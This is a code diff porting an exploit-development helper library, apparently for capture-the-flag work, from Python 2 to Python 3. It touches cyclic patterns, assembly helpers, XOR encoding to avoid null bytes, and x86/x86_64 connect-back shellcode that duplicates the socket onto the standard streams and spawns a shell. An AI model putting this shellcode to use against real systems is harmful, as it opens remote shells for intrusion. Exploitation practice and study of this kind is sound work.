@@ -1,3 +1,7 @@
+from __future__ import print_function
+from builtins import bytes
+import six
+
 import capstone
 import ctypes
 import functools
@@ -32,6 +36,9 @@ def pack64(x):
     if isinstance(x, int):
         return struct.pack("Q", x)
     return x
+
+def ints2bytes(x):
+    return bytes(bytearray(list(x)))
 
 def de_bruijn(k, n):
     a = [0] * k * n
@@ -79,7 +86,7 @@ class Pattern:
         except ValueError:
             return i
         else:
-            raise ValueError, "Not unique!"
+            raise ValueError("Not unique!")
 
 def contains_not(x, bad):
     return not any(c in bad for c in x)
@@ -101,9 +108,9 @@ def yasm(code, bits=32):
         fnameOut = outp.name
         p = subprocess.Popen(["yasm", "-o", outp.name, "--", "-"],
                         stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        out, err = p.communicate(code)
+        out, err = p.communicate(code.encode('utf-8'))
         if p.returncode:
-            print err
+            print(err)
             raise Exception("Assembly failed")
         return outp.read()
 
@@ -122,12 +129,12 @@ def capstone_dump(code, arch=capstone.CS_ARCH_X86, mode=capstone.CS_MODE_32, col
     return res
 
 def xor_str(s, key):
-    return "".join(chr(ord(c)^ord(k)) for c, k in zip(s, itertools.cycle(key)))
+    return ints2bytes(c ^ k for c, k in zip(six.iterbytes(s), itertools.cycle(six.iterbytes(key))))
 
 def xor_pair(s, bad='\0'):
-    a = "\0"*len(s)
+    a = b"\0"*len(s)
     while any(c in a or c in xor_str(a, s) for c in bad):
-        a = "".join(chr(random.randrange(0x100)) for _ in s)
+        a = ints2bytes(random.randrange(0x100) for _ in s)
     return a, xor_str(a, s)
 
 
@@ -222,7 +229,7 @@ class x86_shellcode:
             int 0x80 ;exec sys_connect
             xchg ebx,edx ;save sockfd
             """.format(addr=addr, port=port))
-        assert contains_not(sc, "\0")
+        assert contains_not(sc, b"\0")
         return sc + x86_shellcode.dup2_ebx + x86_shellcode.shell
 
 
@@ -257,15 +264,11 @@ class x86_64_shellcode:
         def p(x): return struct.pack("Q", x)
         def u(x): return struct.pack("Q", x)
         sockaddr = (
-            "\x02\x00" +
-            chr(port>>8) + chr(port&0xff) +
-            "".join(chr(int(x)) for x in addr.split(".")))
+            b"\x02\x00" +
+            bytes([port>>8, port&0xff]) +
+            bytes([int(x) for x in addr.split(".")]))
         # this is to avoid nullbytes only
-        if no_null:
-            a, b = xor_pair(sockaddr, '\0')
-        else:
-            a = "\0"*8
-            b = sockaddr
+        a, b = xor_pair(sockaddr, b'\0')
         a_q = struct.unpack("Q", a)[0]
         b_q = struct.unpack("Q", b)[0]
         sc = x86_64.assemble("""
@@ -296,7 +299,7 @@ class x86_64_shellcode:
             syscall
             """)
         if no_null:
-            assert contains_not(sc, "\0")
+            assert contains_not(sc, b"\0")
         return sc + x86_64_shellcode.dup2_rdi + x86_64_shellcode.shell
 
     @staticmethod
@@ -326,10 +329,10 @@ class x86_64_shellcode:
                 asm += "mov {0}, 0x{1}\n".format(reg, b.encode("hex"))
                 asm += "xor [rsp], {0}".format(reg)
         else:
-            raise Exception, "Don't support negative numbers yet"
+            raise Exception("Don't support negative numbers yet")
         res = x86_64.assemble(asm)
-        print asm
-        print x86_64.disas(res)
+        #print(asm)
+        #print(x86_64.disas(res))
         assert '\0' not in res
         return res
 
@@ -345,7 +348,7 @@ class x86_64_shellcode:
         return res
 
     @staticmethod
-    def mkdir(dirname, mode=0755):
+    def mkdir(dirname, mode=0o755):
         a = x86_64.assemble
         res = "".join((
             x86_64_shellcode.push_string(dirname, reg='rax'),
@@ -445,8 +448,8 @@ class x86_64_shellcode:
 
 for c in [x86_shellcode, x86_64_shellcode]:
     for k, sc in c.__dict__.items():
-        if not k.startswith('_') and isinstance(sc, str):
-            assert contains_not(sc, "\0")
+        if k[0] != '_' and isinstance(sc, (str, bytes)):
+            assert contains_not(sc, b"\0")
 
 class Remote_x86_64(object):
     """ Communicate with shellcode.loader """
@@ -583,7 +586,7 @@ def read_until_match(s, regex):
     return re.match(regex, read_until(s, lambda x: re.match(regex, x))).groups()
 
 def pause():
-    print "[*] Press enter to continue"
+    print("[*] Press enter to continue")
     raw_input()
 
 def socket_interact(s):
